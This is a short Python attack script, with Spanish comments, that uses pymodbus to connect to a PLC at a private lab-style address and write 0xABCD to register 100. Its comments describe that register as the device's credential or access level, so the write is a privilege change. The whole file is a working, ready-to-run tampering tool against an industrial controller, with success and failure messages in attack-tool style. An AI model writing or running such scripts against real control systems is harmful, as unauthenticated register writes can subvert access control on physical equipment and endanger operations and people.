from pymodbus.client import ModbusTcpClient
import sys

# Configuración del objetivo
PLC_IP = "192.168.70.129"
REG_CREDENTIAL = 100  # Registro que representa la credencial o nivel de acceso
NEW_VALUE = 0xABCD   # El "nuevo estado" de privilegio

def change_credential():
    client = ModbusTcpClient(PLC_IP)
    if client.connect():
        print(f"[*] Conectando a {PLC_IP}...")
        # Escribir el nuevo valor de credencial
        result = client.write_register(REG_CREDENTIAL, NEW_VALUE)
        if not result.isError():
            print(f"[+] Credencial cambiada exitosamente a {hex(NEW_VALUE)}")
        else:
            print("[-] Error al escribir en el registro.")
        client.close()
    else:
        print("[-] No se pudo conectar al PLC.")

if __name__ == "__main__":
    change_credential()
